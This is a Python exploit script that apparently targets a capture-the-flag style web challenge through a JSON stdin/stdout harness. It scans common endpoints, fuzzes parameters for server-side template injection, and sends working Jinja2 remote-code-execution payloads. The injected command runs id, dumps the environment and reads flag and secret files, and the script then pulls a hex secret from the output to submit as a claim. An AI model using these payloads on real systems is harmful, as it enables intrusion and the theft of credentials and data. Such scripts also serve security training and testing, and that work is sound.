import sys, json, base64, re, urllib.parse
def log(m):
  try:
    sys.stderr.write(str(m)[:6000]+"\n")
    sys.stderr.flush()
  except: pass
def http(method, path, body=None, headers=None, body_hex=None):
  d={"method": method, "path": path}
  if body is not None: d["body"]=body
  if body_hex is not None: d["body_hex"]=body_hex
  if headers is not None: d["headers"]=headers
  sys.stdout.write(json.dumps({"http": d})+"\n")
  sys.stdout.flush()
  line=sys.stdin.readline()
  if not line:
    raise RuntimeError("no reply")
  r=json.loads(line)
  b64=r.get("body_b64","")
  try: bb=base64.b64decode(b64)
  except: bb=b""
  try: txt=bb.decode(errors="ignore")
  except: txt=""
  return {"status": r.get("status"), "ct": r.get("content_type"), "raw": bb, "txt": txt}
def get(path):
  try: return http("GET", path)
  except Exception as e:
    log(f"GET {path} err {e}")
    return {"status": -1, "txt": "", "raw": b"", "ct": ""}
log("argv:"+str(sys.argv))
# base recon
r0=get("/")
log(f"GET / status={r0['status']} ct={r0['ct']} len={len(r0['txt'])}")
log(r0['txt'][:5000])
for p in ["/robots.txt", "/openapi.json", "/swagger.json", "/api", "/health", "/console"]:
  rr=get(p)
  log(f"GET {p} status={rr['status']} len={len(rr['txt'])} snippet={rr['txt'][:800]!r}")
# SSTI fuzz on /
params=["name","q","query","search","template","page","input","data","content","text","msg","message","user","username","id","title","tpl","view","file"]
payload_ssti="{{7*7}}"
found=[]
for pm in params:
  path="/?"+pm+"="+urllib.parse.quote(payload_ssti, safe="")
  rr=get(path)
  hit=( mist if False else ("49" in rr['txt']))
  log(f"FUZZ /?{pm}=ssti status={rr['status']} hit49={hit} len={len(rr['txt'])} snip={rr['txt'][:600]!r}")
  if hit: found.append(("/", pm, rr['txt'][:2000]))
# fuzz endpoints
endpoints=["/hello","/greet","/hi","/welcome","/render","/template","/view","/page","/search","/preview","/show","/display","/test","/index","/profile"]
for ep in endpoints:
  for pm in ["name","template","input","q","page"]:
    path=ep+"?"+pm+"="+urllib.parse.quote(payload_ssti, safe="")
    rr=get(path)
    hit=("49" in rr['txt'])
    log(f"FUZZ {ep}?{pm} status={rr['status']} hit49={hit} snip={rr['txt'][:400]!r}")
    if hit: found.append((ep, pm, rr['txt'][:2000]))
log(f"FOUND_SSTI={found}")
# try other syntaxes on /?name=
for pl in ["${7*7}", "#{7*7}", "<%= 7*7 %>", "*{7*7}"]:
  path="/?name="+urllib.parse.quote(pl, safe="")
  rr=get(path)
  log(f"ALT {pl!r} status={rr['status']} snip={rr['txt'][:400]!r}")
# if found SSTI, try RCE
candidates=list(found)
if not candidates:
  # fallback: assume /?name= is reflective even without 49? try RCE anyway on /?name
  candidates=[("/","name","")]
  log("no 49 found, trying RCE on /?name anyway")
cmd="pwd;id;ls -la;ls -la /;ls -la /app;env;for f in /secret /flag /flag.txt /secret.txt /app/flag /app/secret /app/flag.txt /app/secret.txt flag flag.txt secret secret.txt /tmp/flag /tmp/secret; do echo ==$f==;cat $f 2>&1;echo;done"
# URL-encode cmd for shell? keep as is inside payload, payload will be URL-encoded as whole
rce_templates=["{{self.__init__.__globals__.__builtins__.__import__('os').popen('CMD').read()}}", "{{cycler.__init__.__globals__.os.popen('CMD').read()}}", "{{namespace.__init__.__globals__.os.popen('CMD').read()}}", "{{lipsum.__globals__.os.popen('CMD').read()}}", "{{config.__class__.__init__.__globals__.os.popen('CMD').read()}}"]
secret_hex_guess=None
for (ep, pm, _) in candidates[:3]:
  for tmpl in rce_templates:
    payload=tmpl.replace("CMD", cmd)
    path=ep+"?"+pm+"="+urllib.parse.quote(payload, safe="")
    rr=get(path)
    txt=rr['txt']
    log(f"RCE try {ep}?{pm} tmpl={tmpl[:30]} status={rr['status']} len={len(txt)} snip={txt[:3000]!r}")
    # look for secret markers
    if "==/secret==" in txt or "==/flag==" in txt or "uid=" in txt or "SECRET" in txt or "flag" in txt.lower():
      log("POTENTIAL RCE SUCCESS full:"+txt[:5000])
    # extract hex strings
    hexes=re.findall(r"[0-9a-fA-F]{16,}", txt)
    if hexes:
      log(f"hexes found: {hexes[:10]}")
      # pick longest
      best=max(hexes, key=len)
      if len(best)>=16:
        secret_hex_guess=best
        log(f"guess={best}")
    if secret_hex_guess and ("uid=" in txt):
      break
  if secret_hex_guess and True:
    pass
# also try POST SSTI
for ep in ["/render","/template","/preview","/view"]:
  for tmpl in rce_templates[:2]:
    payload=tmpl.replace("CMD", "id")
    try:
      rr=http("POST", ep, body=json.dumps({"template": payload}), headers={"Content-Type": "application/json"})
      log(f"POST {ep} json template status={rr['status']} snip={rr['txt'][:800]!r}")
    except Exception as e:
      log(f"POST {ep} err {e}")
    try:
      rr2=http("POST", ep, body="template="+urllib.parse.quote(payload, safe="")+"&name="+urllib.parse.quote(payload, safe=""), headers={"Content-Type": "application/x-www-form-urlencoded"})
      log(f"POST {ep} form status={rr2['status']} snip={rr2['txt'][:800]!r}")
    except Exception as e:
      log(f"POST form err {e}")
log(f"FINAL_GUESS={secret_hex_guess}")
if secret_hex_guess:
  clean=re.sub(r"[^0-9a-fA-F]", "", secret_hex_guess).lower()
  sys.stdout.write("CLAIM:"+json.dumps({"secret_hex": clean})+"\n")
else:
  sys.stdout.write("CLAIM:"+json.dumps({"secret_hex": "00"})+"\n")
sys.stdout.flush()